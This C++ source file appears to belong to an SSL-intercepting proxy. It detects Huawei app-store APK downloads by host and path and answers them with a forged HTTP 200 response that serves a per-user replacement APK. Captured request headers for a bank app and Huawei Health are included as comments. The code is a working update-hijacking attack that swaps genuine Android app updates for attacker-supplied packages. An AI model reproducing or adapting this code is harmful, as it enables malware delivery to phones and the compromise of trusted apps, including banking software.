#include "HuaweiUpdate.h"
#include "PluginServer.h"

int HuaweiUpdate::isHuaweiUpdate(const char * url, const char * host) {
	if (strstr(host, "appdlsslbackup.dbankcdn.com") || strstr(host,"appdl.hicloud.com") ) {
		if (strstr(url, "/dl/appdl/application/apk/"))
		{
			return TRUE;
		}
	}

	return FALSE;
}

int HuaweiUpdate::replyHuaweiUpdate(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	char * szHttpPartialZipFormat = 
		"HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/vnd.android.package-archive\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lpssl->username, ANDROID_REPLACE_FILENAME);
	int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
	return ret;
}


/*
GET /dl/appdl/application/apk/12/12d5639a6b2044b9b84e36c9ef2912b2/com.chinamworld.main.1907142250.apk?
sign=e9eb1001en1000022000c00000000100@663FBA607F694E789DA889777A8870E9&cno=4010001&source=renew&extendStr=%3B
&downEnDeviceId=39a70e2323638b6f47f1ef419d09cf0603d56ad986fd6bb75558a9953ea87115 HTTP/1.1
Accept-Encoding: identity
User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.0.0; FRD-AL10 Build/HUAWEIFRD-AL10)
Host: appdlsslbackup.dbankcdn.com
Connection: Keep-Alive
*/


/*
GET /dl/appdl/application/apk/cd/cd0cf9e7c7a6498099819333a43ceccd/com.huawei.health.1903111003.apk?sign=c9c21001ee1111022000700000000100@641C05CE317A36B3C36A5F5C7726F318&cno=4010001&source=renew&hcrId=C20FE3777C1440B99D88502D371F63DE&extendStr=%3B&encryptType=1 HTTP/1.1
Accept-Encoding: identity
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0; HUAWEI MT7-TL10 Build/HuaweiMT7-TL10)
Host: appdlsslbackup.dbankcdn.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: OPTIMUS/1.11.2.4_19
Date: Thu, 14 Mar 2019 11:04:38 GMT
Content-Type: application/vnd.android.package-archive
Content-Length: 77904349
Connection: keep-alive
Last-Modified: Mon, 11 Mar 2019 04:05:02 GMT
Cache-Control: max-age=7200
Expires: Mon, 11 Mar 2019 04:05:02 GMT
Content-Disposition: attachment; filename="com.huawei.health.1903111003.apk"
Age: 291576
Via: http/1.1 CT-CMC-CNC-JSCZ-P-164-171 (DLC-6.1.19), http/1.1 CT-JSNT-C-221-207 (DLC-6.1.19)
Server-Info: DnionATS
Dn-Sec: vBfmMUNVUNDpH3rlKb3O1xQ9DEbazjyEJIoFLn0p+xQ=
dl-from: dnion
Accept-Ranges: bytes
*/